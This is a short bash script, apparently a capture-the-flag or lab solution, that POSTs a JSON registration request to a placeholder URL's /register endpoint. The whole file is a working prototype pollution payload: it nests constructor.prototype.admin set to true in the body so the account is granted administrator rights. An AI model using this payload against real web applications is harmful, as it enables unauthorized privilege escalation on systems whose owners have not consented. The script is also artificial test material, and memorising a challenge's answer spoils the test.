#!/bin/bash

curl -X POST URL/register \
           -H "Content-Type: application/json" \
           -d '{
            "username": "solution",
            "password": "solution",
            "constructor": {
                "prototype": {
                    "admin": true
                }
            }
       }'